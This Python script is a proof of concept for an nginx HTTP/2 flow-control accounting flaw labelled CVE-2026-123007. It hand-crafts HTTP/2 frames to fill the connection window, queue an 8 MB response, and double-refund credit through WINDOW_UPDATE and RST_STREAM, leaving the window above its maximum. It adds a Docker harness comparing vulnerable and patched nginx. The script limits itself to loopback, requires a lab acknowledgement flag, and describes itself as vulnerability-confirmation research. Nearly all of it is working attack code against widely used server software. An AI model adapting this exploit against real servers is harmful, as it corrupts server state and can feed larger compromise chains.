#!/usr/bin/env python3
"""Compact CVE-2026-123007 accounting proof of concept.

Run the isolated Docker differential with Python 3.10+:

    uv run python -I h2c_flow_control_test.py --docker \
      --acknowledge-local-lab I-AUTHORIZE-LOCAL-LAB

This is an accounting test, not an RCE exploit. TLS support is unvalidated.

Protocol sequence:

Ordering (derived from source analysis of v1.31.8):

 1. Fill the connection send window to exactly 0 with 73 x 896 + 127 bytes
    of responses (all flushed; client reads).
 2. Raise the connection window to MAX: WINDOW_UPDATE(0, MAX)  [accepted,
    send_window = MAX]
 3. Request an 8 MB static file (stream 157) and grant 8 MB of per-stream
    credit WITHOUT reading.  send_chain queues DATA frames while
    connection credit remains, flushing into the TCP send buffer until it
    fills; an environment-dependent tail stays queued in h2c->last_out with
    h2c->send_window decremented accordingly.
 4. Refund event: WINDOW_UPDATE(0, 4 MiB) probes the queued-byte threshold,
    then RST_STREAM(157, CANCEL) if the connection remains usable. Cleanup
    refunds the actual queued amount a second time on vulnerable nginx.
 5. Probe: WINDOW_UPDATE(0, 1).  Accepted => the check underflowed => the
    connection window exceeds MAX => CVE-2026-123007 accounting error
    CONFIRMED. Rejection may appear as GOAWAY or a TCP close without GOAWAY.
 6. Sync PING: proves the connection is alive with the corrupted window.
"""

from __future__ import annotations

import argparse
import hashlib
import ipaddress
import platform
import json
import socket
import ssl
import subprocess
import time
import uuid
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Sequence

MAX = 0x7FFFFFFF
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

DATA = 0
HEADERS = 1
RST_STREAM = 3
SETTINGS = 4
PING = 6
GOAWAY = 7
WINDOW_UPDATE = 8

Frame = tuple[int, int, int, bytes]


@dataclass(frozen=True)
class TargetEvidence:
    """One target's narrow accounting-test result."""

    image: str
    version: str
    expected_exit: int
    actual_exit: int | None = None
    result: str = "not_run"
    detail: str = ""


@dataclass(frozen=True)
class RunEvidence:
    """Reproducible evidence for one bounded isolated differential."""

    schema_version: int = 1
    cve: str = "CVE-2026-123007"
    test: str = "compact-h2c-accounting-differential"
    scope: str = "accounting_only_not_rce"
    tls_validated: bool = False
    network: str = "internal_docker_no_published_ports"
    timeout_seconds: int = 45
    target_images: tuple[str, ...] = ("nginx:1.31.8", "nginx:1.31.9")
    script_sha256: str = ""
    started_at: str = ""
    targets: tuple[TargetEvidence, ...] = ()
    cleanup_attempted: bool = False
    passed: bool = False


@dataclass
class DockerBudget:
    """Hard per-command and per-client limits for a disposable lab run."""

    command_timeout: int = 45
    client_timeout: int = 45
    memory: str = "256m"
    pids_limit: int = 128
    output_limit: int = 1024 * 1024


class LabError(RuntimeError):
    """An expected, bounded lab failure with no exploitability implication."""


END_STREAM = 1
ACK = 1
END_HEADERS = 4

AUTHORITY = 1
PATH = 4
RANGE = 50

NAMES = {
    0: "DATA",
    1: "HEADERS",
    3: "RST_STREAM",
    4: "SETTINGS",
    6: "PING",
    7: "GOAWAY",
    8: "WINDOW_UPDATE",
}


def frame(kind: int, flags: int, stream: int, data: bytes = b"") -> bytes:
    return (
        len(data).to_bytes(3, "big")
        + bytes((kind, flags))
        + stream.to_bytes(4, "big")
        + data
    )


def decode_frames(buf: bytearray, data: bytes) -> list[tuple[int, int, int, bytes]]:
    """Decode complete HTTP/2 frames, retaining an incomplete tail in buf."""
    buf.extend(data)
    out = []
    while len(buf) >= 9:
        length = int.from_bytes(buf[:3], "big")
        if len(buf) < 9 + length:
            break
        kind, flags = buf[3], buf[4]
        stream = int.from_bytes(buf[5:9], "big") & MAX
        payload = bytes(buf[9 : 9 + length])
        del buf[: 9 + length]
        out.append((kind, flags, stream, payload))
    return out


def summarize_result(
    events: list[tuple[int, int, int, bytes]], *, closed: bool, probe_sent: bool
) -> tuple[bool, str]:
    """Classify only a complete post-probe exchange as a positive result."""
    if not probe_sent:
        return False, "INCONCLUSIVE: test ended before the one-byte window probe"
    if closed:
        return False, "NO OVER-CREDIT OBSERVED: TCP closed after the window probe"
    goaway = [payload for kind, _, _, payload in events if kind == GOAWAY]
    if goaway:
        return False, "NO OVER-CREDIT OBSERVED: server sent GOAWAY"
    if not any(
        kind == PING and flags & ACK and stream == 0 and payload == b"POC-SYNC"
        for kind, flags, stream, payload in events
    ):
        return False, "INCONCLUSIVE: post-probe PING acknowledgement absent"
    return True, (
        "OVER-CREDIT: one-byte update accepted, no GOAWAY or TCP close, and "
        "post-probe PING acknowledged; CVE-2026-123007 accounting error observed"
    )


def integer(value, bits, mask=0):
    maximum = (1 << bits) - 1
    if value < maximum:
        return bytes((mask | value,))
    data = bytearray((mask | maximum,))
    value -= maximum
    while value >= 128:
        data.append((value & 127) | 128)
        value >>= 7
    return bytes(data) + bytes((value,))


def literal(name, value):
    value = value.encode()
    return integer(name, 4) + integer(len(value), 7) + value


def request(stream, authority, path="/index.html", extra=b""):
    return frame(
        HEADERS,
        END_STREAM | END_HEADERS,
        stream,
        b"\x82\x87" + literal(AUTHORITY, authority) + literal(PATH, path) + extra,
    )


def setting(value):
    return frame(SETTINGS, 0, 0, b"\0\4" + value.to_bytes(4, "big"))


def update(stream, value):
    return frame(WINDOW_UPDATE, 0, stream, value.to_bytes(4, "big"))


def reset(stream, code=8):
    return frame(RST_STREAM, 0, stream, code.to_bytes(4, "big"))


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    """Accept only loopback targets and an optional lab TLS transport."""
    parser = argparse.ArgumentParser(
        description="Confirm CVE-2026-123007 accounting in an isolated loopback lab."
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--tls", action="store_true")
    parser.add_argument(
        "--docker",
        action="store_true",
        help="Run the isolated h2c Docker differential (conflicts with --tls)",
    )
    parser.add_argument(
        "--platform",
        choices=("native", "linux/amd64", "linux/arm64"),
        default="native",
        help="Docker platform for targets and client; native selects the host architecture",
    )
    parser.add_argument("--output", type=Path, help="Write structured JSON evidence")
    parser.add_argument(
        "--versions",
        default="1.31.8,1.31.9",
        help="Comma-separated vulnerable/patched pairs: 1.31.6,1.31.7,1.31.8,1.31.9",
    )
    parser.add_argument(
        "--command-timeout",
        type=int,
        default=45,
        choices=range(1, 121),
        metavar="1..120",
        help="Maximum seconds per Docker operation",
    )
    parser.add_argument(
        "--client-timeout",
        type=int,
        default=45,
        choices=range(1, 121),
        metavar="1..120",
        help="Maximum seconds for each client differential",
    )
    parser.add_argument(
        "--acknowledge-local-lab",
        required=True,
        help="Must be I-AUTHORIZE-LOCAL-LAB; no other targets are accepted.",
    )
    args = parser.parse_args(argv)
    if args.acknowledge_local_lab != "I-AUTHORIZE-LOCAL-LAB":
        parser.error("explicit local-lab acknowledgement is required")
    if args.docker and args.tls:
        parser.error(
            "--docker runs h2c only; --tls requires a separately supplied lab target"
        )
    try:
        if not ipaddress.ip_address(args.host).is_loopback:
            raise ValueError
    except ValueError:
        parser.error("--host must be a numeric loopback address")
    if not 1 <= args.port <= 65535:
        parser.error("--port must be between 1 and 65535")
    return args


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    if args.docker:
        return docker_differential(
            args.output,
            args.command_timeout,
            args.client_timeout,
            args.versions,
            args.platform,
        )
    host, port = args.host, args.port
    address = ipaddress.ip_address(host)
    authority = f"[{host}]:{port}" if address.version == 6 else f"{host}:{port}"
    raw = socket.socket(socket.AF_INET6 if address.version == 6 else socket.AF_INET)
    raw.settimeout(3)
    events: list[tuple[int, int, int, bytes]] = []
    try:
        raw.connect((host, port))
        if args.tls:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            # Certificate verification is disabled only for the disposable,
            # numeric-loopback target accepted by parse_args above.
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_alpn_protocols(["h2"])
            raw = context.wrap_socket(raw, server_hostname="localhost")
            if raw.selected_alpn_protocol() != "h2":
                raise RuntimeError("target did not negotiate HTTP/2 with ALPN")
        try:
            raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
        except OSError:
            pass
    except (OSError, RuntimeError) as exc:
        raw.close()
        print(f"ERROR: local connection setup failed: {exc}", flush=True)
        return 2

    buf = bytearray()

    def describe(kind, flags, stream, payload):
        name = NAMES.get(kind, f"kind{kind}")
        detail = ""
        if kind == RST_STREAM and len(payload) == 4:
            detail = f" err={int.from_bytes(payload, 'big')}"
        elif kind == GOAWAY and len(payload) >= 8:
            detail = f" last={int.from_bytes(payload[:4], 'big')} err={int.from_bytes(payload[4:8], 'big')}"
        elif kind == DATA:
            detail = f" len={len(payload)}"
        print(f"      <- {name} stream={stream} flags={flags}{detail}", flush=True)
        events.append((kind, flags, stream, payload))

    def drain(seconds, tag):
        raw.settimeout(0.25)
        deadline = time.monotonic() + seconds
        closed = False
        while time.monotonic() < deadline:
            try:
                data = raw.recv(262144)
                if not data:
                    print(f"    [{tag}] TCP closed", flush=True)
                    closed = True
                    break
                for f in decode_frames(buf, data):
                    describe(*f)
            except socket.timeout:
                pass
        return closed

    send = raw.sendall
    probe_sent = False
    try:
        print("== stage 1: fill conn window to 0 (73x896 + 127)", flush=True)
        send(PREFACE + frame(SETTINGS, 0, 0, b"\0\1\0\0\0\0\0\4\0\0\xff\xff"))
        drain(1, "init")
        send(frame(SETTINGS, ACK, 0))
        send(
            b"".join(request(stream, authority) for stream in range(1, 147, 2))
            + request(147, authority, extra=literal(RANGE, "bytes=0-126"))
        )
        closed = drain(2, "fill")
        if closed or any(kind == GOAWAY for kind, _, _, _ in events):
            raise RuntimeError("target did not complete the 65,535-byte fill")

        print("== stage 2: WINDOW_UPDATE(0, MAX) => conn window = MAX", flush=True)
        send(update(0, MAX))
        closed = drain(1, "raise") or closed
        if closed or any(kind == GOAWAY for kind, _, _, _ in events):
            raise RuntimeError("target rejected the initial connection-window refill")

        print(
            "== stage 3: request big.bin on stream 157, grant 8MB credit, stop reading",
            flush=True,
        )
        send(request(157, authority, path="/big.bin"))
        closed = drain(1, "req157") or closed
        if closed or any(kind == GOAWAY for kind, _, _, _ in events):
            raise RuntimeError("target rejected the large-file request")
        # Grant per-stream credit in chunks; do NOT read (drain 0) so the socket
        # buffer fills and the tail of the 8MB stays queued.
        if not closed:
            for _ in range(122):
                send(update(157, 65535))
                time.sleep(0.03)
            # Give nginx a moment to queue behind the full socket buffer.
            time.sleep(1.5)

        print("== stage 4: refund event: update(0, 4MB) then RST 157", flush=True)
        # With no prior queued bytes, window = MAX - queued, so the update
        # probes whether at least 4 MiB remains queued. Patched nginx includes
        # queued bytes in its bound; its server log gives the effective total.
        if not closed:
            send(update(0, 4194304))
            closed = drain(1, "wu4M")
        if not closed and not any(kind == GOAWAY for kind, _, _, _ in events):
            send(reset(157))
            closed = drain(2, "rst157")
        else:
            print(
                "The 4 MiB update was rejected; the server log determines the queued-byte bound.",
                flush=True,
            )

        print(
            "== stage 5: probe WINDOW_UPDATE(0, 1): accepted => over-credit", flush=True
        )
        if not closed and not any(kind == GOAWAY for kind, _, _, _ in events):
            send(update(0, 1))
            probe_sent = True
            closed = drain(2, "probe1")

        print("== stage 6: sync PING", flush=True)
        if (
            probe_sent
            and not closed
            and not any(kind == GOAWAY for kind, _, _, _ in events)
        ):
            send(frame(PING, 0, 0, b"POC-SYNC"))
            closed = drain(3, "ping")
    except (OSError, RuntimeError) as exc:
        print(f"ERROR: local test did not complete: {exc}", flush=True)
        if not probe_sent:
            print(">>> INCONCLUSIVE: protocol stage did not complete", flush=True)
            return 2
        closed = True
    finally:
        raw.close()

    positive, summary = summarize_result(events, closed=closed, probe_sent=probe_sent)
    print(f">>> {summary}", flush=True)
    print(
        "This is an accounting test only; it does not demonstrate code execution.",
        flush=True,
    )
    return 0 if positive else 1


def sha256_file(path: Path) -> str:
    """Hash one local script or evidence file for reproducibility."""
    return hashlib.sha256(path.read_bytes()).hexdigest()


def docker_differential(
    output: Path | None = None,
    command_timeout: int = 45,
    client_timeout: int = 45,
    versions: str = "1.31.8,1.31.9",
    platform_name: str = "native",
) -> int:
    """Run a bounded, isolated h2c differential and optionally save JSON evidence."""
    label = "io.censys.research.nginx2root-compact"
    run_id = f"selftest-{uuid.uuid4().hex[:12]}"
    network = f"nginx2root-compact-{run_id}"
    docker_platform = (
        f"linux/{'arm64' if platform.machine().lower() in {'arm64', 'aarch64'} else 'amd64'}"
        if platform_name == "native"
        else platform_name
    )
    config = (
        "user nginx; worker_processes 1; "
        "events { worker_connections 1024; } "
        "http { include /etc/nginx/mime.types; "
        "default_type application/octet-stream; sendfile on; "
        "server { listen 80; http2 on; server_name localhost; "
        "root /usr/share/nginx/html; "
        "location / { try_files $uri $uri/ =404; } } }"
    )
    evidence = RunEvidence(
        timeout_seconds=client_timeout,
        target_images=tuple(f"nginx:{version}" for version in versions.split(",")),
        script_sha256=sha256_file(Path(__file__)),
        started_at=datetime.now(timezone.utc).isoformat(),
    )
    selected_versions = tuple(versions.split(","))
    supported_versions = {
        *(f"1.30.{minor}" for minor in range(7)),
        *(f"1.31.{minor}" for minor in range(10)),
    }
    if not selected_versions or any(
        version not in supported_versions for version in selected_versions
    ):
        raise ValueError(
            "versions must be comma-separated nginx 1.30.0-1.30.6 or 1.31.0-1.31.9"
        )
    targets: list[TargetEvidence] = []
    passed = False
    exit_code = 2

    def docker(
        *args: str, timeout: int = command_timeout
    ) -> subprocess.CompletedProcess[str]:
        """Run one bounded Docker operation without invoking a shell."""
        return subprocess.run(
            ["docker", *args],
            check=True,
            text=True,
            stdout=subprocess.PIPE,
            stderr=None,
            timeout=timeout,
        )

    try:
        docker("info")
        docker(
            "network", "create", "--internal", "--label", f"{label}={run_id}", network
        )
        for version, expected in tuple(
            (version, 0 if version != "1.31.9" else 1) for version in selected_versions
        ):
            name = f"nginx2root-compact-{version}-{run_id}"
            target = TargetEvidence(
                image=f"nginx:{version}", version=version, expected_exit=expected
            )
            targets.append(target)
            docker(
                "run",
                "-d",
                "--name",
                name,
                "--platform",
                docker_platform,
                "--network",
                network,
                "--label",
                f"{label}={run_id}",
                "--cap-drop",
                "ALL",
                "--cap-add",
                "CHOWN",
                "--cap-add",
                "SETGID",
                "--cap-add",
                "SETUID",
                "--security-opt",
                "no-new-privileges",
                "--memory",
                "256m",
                "--pids-limit",
                "128",
                "--entrypoint",
                "sh",
                f"nginx:{version}",
                "-c",
                "dd if=/dev/zero of=/usr/share/nginx/html/big.bin "
                "bs=1048576 count=8 status=none && "
                f"printf '%s' '{config}' > /etc/nginx/nginx.conf && "
                "exec nginx -g 'daemon off;'",
            )
            for _ in range(30):
                ready = subprocess.run(
                    [
                        "docker",
                        "exec",
                        name,
                        "sh",
                        "-c",
                        "nginx -t >/dev/null 2>&1 && grep -a -l "
                        "'nginx: worker process' /proc/[0-9]*/cmdline >/dev/null 2>&1",
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=command_timeout,
                )
                if ready.returncode == 0:
                    break
                time.sleep(0.2)
            else:
                raise RuntimeError(f"nginx {version} did not become ready")
            result = subprocess.run(
                [
                    "docker",
                    "run",
                    "--rm",
                    "--platform",
                    "linux/amd64",
                    "--network",
                    f"container:{name}",
                    "--security-opt",
                    "no-new-privileges",
                    "--memory",
                    "128m",
                    "--pids-limit",
                    "64",
                    "--entrypoint",
                    "/bin/sh",
                    "-v",
                    f"{Path(__file__).resolve()}:/src/h2c_flow_control_test.py:ro",
                    "python:3.10-slim",
                    "-c",
                    "python -I /src/h2c_flow_control_test.py --host 127.0.0.1 --port 80 "
                    "--acknowledge-local-lab I-AUTHORIZE-LOCAL-LAB",
                ],
                timeout=client_timeout,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            targets[-1] = TargetEvidence(
                image=target.image,
                version=version,
                expected_exit=expected,
                actual_exit=result.returncode,
                result="passed" if result.returncode == expected else "failed",
                detail=result.stdout[-4096:],
            )
            if result.returncode != expected:
                print(
                    f"ERROR: nginx {version} returned {result.returncode}, expected {expected}",
                    flush=True,
                )
                return 1
        passed = True
        exit_code = 0
        print(
            "PASS: vulnerable h2c accepted over-credit; patched control rejected it",
            flush=True,
        )
        return 0
    except FileNotFoundError:
        print("ERROR: Docker is required for --docker", flush=True)
        return 2
    except (
        subprocess.CalledProcessError,
        subprocess.TimeoutExpired,
        RuntimeError,
    ) as exc:
        print(f"ERROR: isolated differential failed: {exc}", flush=True)
        return 2
    finally:
        owned = subprocess.run(
            ["docker", "ps", "-aq", "--filter", f"label={label}={run_id}"],
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            timeout=command_timeout,
        )
        for container in owned.stdout.splitlines():
            subprocess.run(
                ["docker", "rm", "-f", container],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=command_timeout,
            )
        subprocess.run(
            ["docker", "network", "rm", network],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=command_timeout,
        )
        if output is not None:
            record = RunEvidence(
                timeout_seconds=client_timeout,
                target_images=evidence.target_images,
                script_sha256=evidence.script_sha256,
                started_at=evidence.started_at,
                targets=tuple(targets),
                cleanup_attempted=True,
                passed=passed,
            )
            output.parent.mkdir(parents=True, exist_ok=True)
            output.write_text(
                json.dumps(asdict(record), indent=2) + "\n", encoding="utf-8"
            )
            print(f"Wrote evidence: {output}", flush=True)


if __name__ == "__main__":
    raise SystemExit(main())
